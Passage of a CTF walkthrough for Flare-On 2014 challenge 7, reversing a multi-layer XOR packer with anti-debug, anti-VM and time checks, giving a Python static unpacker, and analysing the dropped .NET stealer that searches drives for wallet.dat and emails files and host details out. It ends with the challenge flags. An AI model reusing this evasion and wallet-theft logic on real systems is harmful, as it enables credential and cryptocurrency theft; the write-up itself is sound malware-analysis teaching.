The loop looks strange. You may ask: why `byte_4131F7` and not `Buffer`? Because the decompiler moved `++i` before the XOR. After `++i`, `byte_4131F7[i]` is `Buffer[i - 1]`.

`e.root-servers.net` is one of the DNS root servers, so its IP almost never changes. Note that the key is the IP **as text** (like `"1.2.3.4"`), not as four bytes. If the DNS lookup fails, the function does nothing.

#### sub_4018A0: a key from a tweet

![Tweet download function pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-tweet-download.png' | relative_url }})

The last layer gets its key from Twitter:

```c
v1 = InternetOpenW(L"ZBot", 1u, nullptr, nullptr, 0);
wcscpy(szUrl, L"https://twitter.com/FireEye/status/484033515538116608");
v3 = InternetOpenUrlW(v1, szUrl, nullptr, 0, 0x400100u, 0);
while ( 1 ) {
    InternetReadFile(v3, Buffer, 0x1000u, &dwNumberOfBytesRead);
    // append the data to v5
    ...
}
```

It downloads a FireEye tweet and keeps the whole page in `v5`. The user agent is "ZBot", a small joke: ZBot (Zeus) is a famous banking trojan. (Careful: this `Buffer` is a local 4 KB array, not our global `Buffer`.)

![Tweet key extraction pseudocode]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-ida-tweet-key-extraction.png' | relative_url }})

```c
strcpy(SubStr, "Secluded Hi");
v6 = strstr(v5, SubStr);
if ( v6 ) {
    v7 = malloc(8u);
    strncpy(v7, v6 + 11, 7u);
    v8 = strlen(v7);
    // same strange loop as in sub_4017A0
}
```

The program searches the page for `"Secluded Hi"`. This text is 11 characters long, so `v6 + 11` is the position right after it. Then it copies the next **7 characters**, and these 7 characters are the key.

So the last key is not in the file at all. It is in a tweet on the internet.

#### MZ and PE come from the command line

After the last two layers, `_main` writes four bytes into `Buffer`:

```c
Buffer[0] = *argv[1];
byte_4131F9 = argv[1][1];
byte_413278 = *argv[2];
byte_413279 = argv[2][1];
```

`byte_4131F9` is `Buffer[1]`. `byte_413278` is `0x4131F8 + 0x80`, so it is `Buffer[0x80]`. In plain text:

```text
byte_4131F8[0x00..0x01] = argv[1][0..1]
byte_4131F8[0x80..0x81] = argv[2][0..1]     (0x413278 = 0x4131F8 + 0x80)
```

You may ask: why do we think about a PE file here? At the end of `_main` (we will see it soon), this `Buffer` is saved as `gratz.exe` and run with `system()`. Windows can run it as an `.exe` only if it is a PE file, so we expect a PE.

A PE file starts with `MZ` at offset 0. At offset `0x3C` of this header, there is a 4-byte field with the name `e_lfanew`. It holds the file offset of the real PE header, and this header starts with the signature `PE\0\0`:

```text
0x00:  "MZ"
0x3C:  e_lfanew = 0x80  ---+
                           |
0x80:  "PE\0\0"  <---------+
```

`0x80` is a very common `e_lfanew` value. So it looks like the author removed both signatures from the blob, and we must give them as arguments:

```text
backdoge.exe MZ PE
```

Without these arguments, the program reads `argv[1]` and it crashes.

#### The end of `_main`: gratz.exe

Finally, the end of `_main`:

```c
strcpy(FileName, "gratz.exe");
v7 = fopen(FileName, "wb");
fwrite(Buffer, 1u, ElementCount, v7);
fclose(v7);
system(FileName);
```

So `_main` writes the whole `Buffer` (all `0x106240` bytes) to a file with the name **gratz.exe**. Then it runs this file with `system()`.

Now we know everything `_main` does. Let's put all the layers in one table, in call order:

| Function    | Check                                                                 |
| ----------- | --------------------------------------------------------------------- |
| sub_401030  | `IsDebuggerPresent`                                                   |
| sub_4010C0  | `PEB.BeingDebugged` (`fs:[30h]+2`)                                    |
| sub_401130  | `sidt` "red pill" VM check                                            |
| sub_4011D0  | VMware backdoor port (`in` with `'VMXh'`), single-byte key            |
| sub_4012A0  | `SetLastError` / `OutputDebugString` / `GetLastError` trick           |
| sub_401350  | Counts `0xCC` bytes in its own code (expects `0x55`)                  |
| sub_4013F0  | `PEB.NtGlobalFlag == 0x70`                                            |
| sub_401460  | Is today Friday? (`tm_wday == 5`)                                     |
| sub_4014F0  | `argv[0]` must be the same as the string at `0x519440`                |
| sub_401590  | IP of www.dogecoin.com compared with 127.0.0.1                        |
| sub_4016F0  | Is the hour 17? (`tm_hour == 0x11`)                                   |
| inline loop | XOR with `argv[0]`, `i % 12`                                          |
| sub_4017A0  | XOR with the IP string of `e.root-servers.net`                        |
| sub_4018A0  | Downloads a FireEye tweet, takes the 7 characters after "Secluded Hi" |

So the list is a small museum of anti-debug and anti-VM tricks. Some checks look at the debugger, some look at the VM, and some only look at the clock, the file name or the network. For each check, we have a guess about the "right" branch: no debugger, real hardware, a Friday at 17:00, the name `backdoge.exe` and so on. But these are only guesses from the code. We do not know yet which path really gives us the correct file.

Of course we will not try to set up these conditions. We will decrypt it statically.

### Unpacking without running it

{: #unpacking-without-running-it}

Our plan is simple: we write every layer again in Python, and we produce `gratz.exe` ourselves.

For this script, I got help from an LLM: I gave it the keys, the addresses and the lengths from our analysis, and it wrote the code. Here is the full script, `unpack_gratz.py`:

```python
#!/usr/bin/env python3
# unpack_gratz.py - Flare-On 2014 challenge 7
# Decrypts the embedded gratz.exe statically, without running the challenge.
# Usage: python unpack_gratz.py <challenge.exe>

import itertools
import struct
import sys

BUF_VA  = 0x4131F8          # Buffer       (byte_4131F8)
SIZE_VA = 0x519438          # ElementCount (dword_519438)
DOS_TEXT = b"This program cannot be run in DOS mode"


class PE:
    """Very small PE reader: only what we need to read bytes by VA."""

    def __init__(self, data):
        self.data = data
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        nsec = struct.unpack_from("<H", data, e_lfanew + 6)[0]
        opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
        self.base = struct.unpack_from("<I", data, e_lfanew + 24 + 28)[0]
        self.sections = []
        sec = e_lfanew + 24 + opt_size
        for _ in range(nsec):
            vsize, va, rsize, raw = struct.unpack_from("<IIII", data, sec + 8)
            self.sections.append((va, max(vsize, rsize), raw, rsize))
            sec += 40

    def read(self, va, n):
        rva = va - self.base
        for sva, size, raw, rsize in self.sections:
            if sva <= rva < sva + size:
                off = rva - sva
                chunk = self.data[raw + off: raw + min(off + n, rsize)]
                return chunk + b"\0" * (n - len(chunk))
        raise ValueError("VA not in any section: %#x" % va)

    def dword(self, va):
        return struct.unpack("<I", self.read(va, 4))[0]


def xor(buf, key):
    """Repeating-key XOR: buf[i] ^= key[i % len(key)]"""
    rep = (key * (len(buf) // len(key) + 1))[:len(buf)]
    x = int.from_bytes(buf, "little") ^ int.from_bytes(rep, "little")
    return x.to_bytes(len(buf), "little")


def main():
    data = open(sys.argv[1], "rb").read()
    pe = PE(data)

    def key(va, n):                 # n bytes at a VA
        return pe.read(va, n)

    def str_key(s, len_va):         # a string key, its length is in a dword
        off = data.find(s)
        return data[off: off + pe.dword(len_va)]

    # Layers with two branches: (name, (label, key), (label, key))
    layers = [
        ("sub_401030 IsDebuggerPresent",
            ("no debugger", key(0x413060, 0x13)), ("debugger", key(0x413074, 0xD))),
        ("sub_4010C0 PEB.BeingDebugged",
            ("no debugger", str_key(b"omglob", 0x4130A4)),
            ("debugger", str_key(b"UNACCEPTABLE!", 0x4130A8))),
        ("sub_401130 sidt (red pill)",
            ("top byte != 0xFF", key(0x4130AC, 0xD)), ("top byte == 0xFF", key(0x4130BC, 0xE))),
        ("sub_4011D0 VMware backdoor",
            ("not VMware", key(0x413073, 1)), ("VMware", key(0x413081, 1))),
        ("sub_4012A0 OutputDebugString",
            ("last error != 0x1234", key(0x4130DC, 0x1B)), ("last error == 0x1234", key(0x4130F8, 0x1C))),
        ("sub_401350 0xCC count",
            ("count == 85", key(0x41311C, 0x1A)), ("count != 85", key(0x413138, 0x11))),
        ("sub_4013F0 PEB.NtGlobalFlag",
            ("no debugger", key(0x413154, pe.dword(0x413178))),
            ("debugger", str_key(b"Feel the sting of the Monarch!", 0x41317C))),
        ("sub_401460 day of week",
            ("Friday", key(0x413180, 9)), ("not Friday", key(0x41318C, 4))),
        ("sub_401590 www.dogecoin.com",
            ("127.0.0.1", key(0x4131CC, 0xC)), ("other IP", key(0x4131BC, 0x10))),
        ("sub_4016F0 hour",
            ("17:00", key(0x4131E0, 9)), ("not 17:00", key(0x4131EC, 2))),
    ]

    # Layers with one known key
    fixed = [
        ("sub_4014F0 file name", key(0x413198, 0xC)),   # argv[0] == "backdoge.exe"
        ("inline loop argv[0]",  b"backdoge.exe"),
        ("sub_4017A0 e.root-servers.net", b"192.203.230.10"),
        ("sub_4018A0 tweet",     b"jackRAT"),
    ]

    size = pe.dword(SIZE_VA)
    blob = pe.read(BUF_VA, size)
    print("Buffer size: %#x bytes" % size)

    # 1) Remove the fixed layers from the first 0x80 bytes
    head = blob[:0x80]
    for _, k in fixed:
        head = xor(head, k)

    # 2) Try all 2^10 = 1024 branch combinations on these 0x80 bytes
    matches = []
    for combo in itertools.product((0, 1), repeat=len(layers)):
        h = head
        for layer, choice in zip(layers, combo):
            h = xor(h, layer[1 + choice][1])
        if DOS_TEXT in h:
            matches.append(combo)

    if not matches:
        sys.exit("No combination gives a DOS header.")
    combo = matches[0]
    print("Matches: %d" % len(matches))
    for layer, choice in zip(layers, combo):
        print("  %-32s -> %s" % (layer[0], layer[1 + choice][0]))

    # 3) Decrypt the whole Buffer with the winning keys
    for _, k in fixed:
        blob = xor(blob, k)
    for layer, choice in zip(layers, combo):
        blob = xor(blob, layer[1 + choice][1])

    # 4) Do what argv[1] and argv[2] do in _main
    blob = bytearray(blob)
    blob[0:2] = b"MZ"
    blob[0x80:0x82] = b"PE"

    e_lfanew = struct.unpack_from("<I", blob, 0x3C)[0]
    print("e_lfanew: %#x, signature: %r" % (e_lfanew, bytes(blob[e_lfanew:e_lfanew + 4])))

    open("gratz.exe", "wb").write(blob)
    print("Wrote gratz.exe")


if __name__ == "__main__":
    main()
```

```text
$ python unpack_gratz.py d69650fa6d4825ec2ddeecdc6a92228d.exe
```

So what does it do? In short, four steps:

| Step | What it does                                                                                                           |
| ---- | ---------------------------------------------------------------------------------------------------------------------- |
| 1    | Removes the four fixed keys from the first `0x80` bytes                                                                |
| 2    | Tries all 1024 combinations of the other 10 layers and looks for the DOS stub text                                     |
| 3    | Decrypts the whole `Buffer` with the winning keys                                                                      |
| 4    | Writes `MZ` and `PE` back, like `argv[1]` and `argv[2]` do, prints `e_lfanew` and the signature, and saves `gratz.exe` |

The four fixed keys are `backdoge.exe` (the inline loop), the 12-byte key at `0x413198` (`sub_4014F0`, because the name is always `backdoge.exe`), `192.203.230.10` (the long-time IP of `e.root-servers.net`) and `jackRAT`. You may ask: where does `jackRAT` come from? It is the tweet key. The tweet at the URL in `sub_4018A0` had the text `... Secluded HijackRAT http://t.co/ckx18JHdkb ...`, and the 7 characters after "Secluded Hi" are `jackRAT`. (Yes, here I cheated a little: the tweet page does not open now, so I took the text from another write-up.)

For the other 10 layers, the script tries all `2^10 = 1024` combinations. But it does not decrypt the whole `Buffer` for each one. It looks only at the first `0x80` bytes.

You may ask: why only `0x80` bytes? First, speed. `Buffer` is about 1 MB, so 1024 combinations × 10 layers × 1 MB would be about 10 GB of XOR work. With `0x80` bytes, it is only about 1.3 MB. Second, these bytes are enough for the test. In a normal PE, the DOS stub text "This program cannot be run in DOS mode" starts at offset `0x4E` and ends before `0x80`. So the first `0x80` bytes alone tell us if a combination is right.

When the script finds the right combination, it decrypts the whole 1 MB only once.

Let's run it on the challenge file:

![Static payload unpacker output]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-unpacker-output.png' | relative_url }})

Only one of the 1024 combinations (`Matches: 1`) gives a DOS header. Now we can see the environment that the author really wanted:

| Check                          | Winning branch       |
| ------------------------------ | -------------------- |
| `sub_401030` IsDebuggerPresent | no debugger          |
| `sub_4010C0` PEB.BeingDebugged | no debugger          |
| `sub_401130` sidt (red pill)   | top byte != 0xFF     |
| `sub_4011D0` VMware backdoor   | not VMware           |
| `sub_4012A0` OutputDebugString | last error != 0x1234 |
| `sub_401350` 0xCC count        | count == 85          |
| `sub_4013F0` PEB.NtGlobalFlag  | no debugger          |
| `sub_401460` day of week       | Friday               |
| `sub_401590` www.dogecoin.com  | other IP             |
| `sub_4016F0` hour              | 17:00                |

Most of our guesses were right: no debugger, no VM, Friday, 17:00. But look at `sub_401590`. The winning branch is **other IP**, not `127.0.0.1`. So the author did not want `www.dogecoin.com` to point to localhost. The `127.0.0.1` branch was a trap. Good that we did not trust our guess there.

### gratz.exe: the last stage

{: #gratzexe-the-last-stage}

We have a new file, so let's do the same thing as at the start and open it in DiE:

![Extracted payload executable identification]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-payload-identification.png' | relative_url }})

It is a C# program for .NET, and it has a GUI.

So we open it in dnSpy. The main class has the name `lulz`. Yes, really.

#### Four decoders, one idea

All strings in the class are hidden with functions like this one:

```csharp
public string decoder1(string encoded)
{
    string text = "";
    string text2 = "lulz";
    for (int i = 0; i < encoded.Length; i++)
        text += (char)(encoded[i] ^ text2[i % text2.Length]);
    return text;
}
```

This is repeating-key XOR again. We saw it so many times in this challenge that it feels like an old friend. Only the key changes:

| Decoder  | Key                                       |
| -------- | ----------------------------------------- |
| decoder1 | `"lulz"`                                  |
| decoder2 | `"this"`                                  |
| decoder3 | `"silly"`                                 |
| decoder4 | another string, encrypted with `decoder2` |

`decoder4` is a little different. Its key is also hidden:

```csharp
string text2 = decoder2("\u001b\u0005\u000eS\u001d\u001bI\a\u001c...");
```

In Python, all of them are very short:

```python
def x(s, k): return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(s))
d1 = lambda s: x(s, "lulz")
d2 = lambda s: x(s, "this")
d3 = lambda s: x(s, "silly")
k4 = d2("\x1b\x05\x0eS\x1d\x1bI\x07\x1c\x01\x1aS\x00\x00\x0cS\x06\x0d\x08\x1fT\x07\x07\x16K")
```

The value of `k4` is **"omg is this the real one?"**.

#### What does datwork() do?

![Datwork method in dnSpy]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-dnspy-datwork.png' | relative_url }})

On the left, we see that the real name of the assembly is `Finisher.exe`, with the namespace `Finisher`. Inside it there are three classes: `Form1`, `lulz` and `Program`. The `lulz` class has the interesting methods: `datwork()`, `yum()` and four decoders, `decoder1` to `decoder4`. On the right is `datwork()`. Almost every string in it goes through one of the decoders, so we decode them with our Python helpers from above.

For every drive, `datwork()` calls `yum()`. Let's look at `yum()` in dnSpy before we decode the strings:

![Recursive wallet search in dnSpy]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-dnspy-yum.png' | relative_url }})

It is a simple recursive search:

```csharp
foreach (string text in Directory.GetFiles(folder))
    if (text.EndsWith(name))                       // name = "wallet.dat"
    {
        info += decoder3("=\u0006\u0001\u001fCS") + text + "\n";   // "Noms: " + path
        info += Convert.ToBase64String(File.ReadAllBytes(text)) + "\n";
    }
foreach (string text2 in Directory.GetDirectories(folder))
    yum(text2, name, ref info);                    // go into every subfolder
```

For every file whose name ends with `name`, it adds a `Noms: <path>` line and the whole file as base64 to `info`. Then it calls itself for every subfolder. In `datwork()`, `name` is `decoder1(...)`, and this decodes to `wallet.dat`.

We decode all strings in `datwork()` and in `yum()`:

| String                | Decoded                                                            |
| --------------------- | ------------------------------------------------------------------ |
| Header                | `Dat Beacon:` and a dashed line                                    |
| Fields                | `Machine:`, `UserDomain:`, `User:`, `OS Version:`, `Drive:`, `IP:` |
| File it searches for  | `wallet.dat`                                                       |
| Line before each file | `Noms: `                                                           |
| Mail to               | `al1.dat.data@flare-on.com`                                        |
| Subject               | `I'm a computer`                                                   |
| From                  | `lulz@flare-on.com`                                                |
| SMTP server           | `smtp.secureserver.net`                                            |

Now the picture is clear. This "congratulations" program is a small info stealer:

1. It collects the machine name, the domain, the user name, the OS version and the IP.
2. For every drive, it calls `yum()`. `yum()` searches all folders recursively for `wallet.dat` files (Bitcoin wallets).
3. For each file, it adds a `Noms: <path>` line and the file content as base64.
4. It sends everything by email.

One stolen file looks like this in the mail body:

```text
Noms: C:\Users\alice\AppData\Roaming\Bitcoin\wallet.dat
AQAAAAAAAADQjJ3fARXREYx6AMBP...   (whole file as base64)
```

The malware "eats" your wallets.

#### Where is the flag?

Who calls `datwork()`? Let's look at `Form1`:

![Form initialization code in dnSpy]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-dnspy-form1.png' | relative_url }})

When the window opens, `Form1` starts `lulzors()` in a new thread. `lulzors()` starts one more thread for `datwork()`, and then it waits in an empty `while` loop until `datwork()` is finished. Only after that, it writes a decoded string into `label2`. This is the line under "Please send your address and phone number to:" in the window.

The flag is in `label2`. It is decoded with `decoder4`:

```python
print(x("\x0b\x0cP\x0e\x0fBA\x06\x0dG\x15I\x1a\x01\x16H\\\x09\x08\x02\x13/\x08\x09^\x1d\x08JO\x07]C\x1b\x05", k4))
```

```text
da7.f1are.finish.lin3@flare-on.com
```

I ran `gratz.exe` in a VM, and this window came up:

![Final payload congratulations window]({{ '/assets/images/flare-on-2014-solutions-part-2/challenge-07-congratulations-window.png' | relative_url }})

Here, there is a catch. `label2` is empty at the start. `lulzors()` waits for the `datwork()` thread, and `label2` is filled only **after** the email is sent. So if everything worked, the window **CONGRATULATIONS!** would look like this:

```text
This guy says you are almost done!

        [ picture from the resources ]

      Please send your address and
           phone number to:
   da7.f1are.finish.lin3@flare-on.com

We would like to contact you to verify
how you completed the challenges and then
          send you your prize!
```

So, that was the end. Phew, what a long and tiring challenge.

## Wrapping up

{: #wrapping-up}

Here are all the flags:

| Challenge | Flag                                 |
| --------- | ------------------------------------ |
| 4         | `wa1ch.d3m.spl01ts@flare-on.com`     |
| 5         | `l0gging.ur.5tr0ke5@flare-on.com`    |
| 6         | `l1nhax.hurt.u5.a1l@flare-on.com`    |
| 7         | `da7.f1are.finish.lin3@flare-on.com` |

That was the walkthrough of challenges 4 to 7. Thanks for reading. See you later...
